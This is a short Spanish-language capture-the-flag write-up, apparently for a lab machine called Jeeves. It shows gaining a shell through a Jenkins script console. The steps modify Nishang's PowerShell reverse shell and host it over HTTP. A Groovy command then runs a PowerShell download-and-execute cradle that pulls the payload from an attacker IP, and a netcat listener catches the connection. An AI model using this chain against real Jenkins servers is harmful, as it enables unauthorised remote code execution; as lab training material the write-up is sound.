## Vuln exploit & Gaining Access {-}

### Ganando accesso con Jenkins Consola de scripts {-}

1. Descargamos Nishang y modificamos el fichero de reverse shell por tcp

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang/Shells
    cp Invoke-PowerShellTcp.ps1 ../../PS.ps1
    cd ../..
    nano PS.ps1
    ```

    Modificamos el fichero PS.ps1 para añadir `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443` al final del fichero

1. Compartimos un servicio http con python

    ```bash
    python3 -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Creamos el Groovy script

    ```bash
    command = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')"
    println(command.execute().text)
    ```

Ya hemos ganado accesso al systema. `whoami` -> **jeeves\kohsuke**. Ya podemos leer la flag.